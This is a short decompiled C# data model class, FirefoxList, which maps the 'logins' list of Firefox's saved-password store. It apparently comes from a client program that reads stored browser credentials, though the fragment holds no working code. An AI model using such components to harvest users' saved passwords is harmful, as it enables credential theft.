using System;
using System.Collections.Generic;
using System.Runtime.Serialization;

namespace client.Models
{
	// Token: 0x02000015 RID: 21
	public class FirefoxList
	{
		// Token: 0x17000040 RID: 64
		// (get) Token: 0x0600009F RID: 159 RVA: 0x00002964 File Offset: 0x00000B64
		// (set) Token: 0x060000A0 RID: 160 RVA: 0x0000296C File Offset: 0x00000B6C
		[DataMember(Name = "logins")]
		public List<FirefoxLogins> logins { get; set; }
	}
}
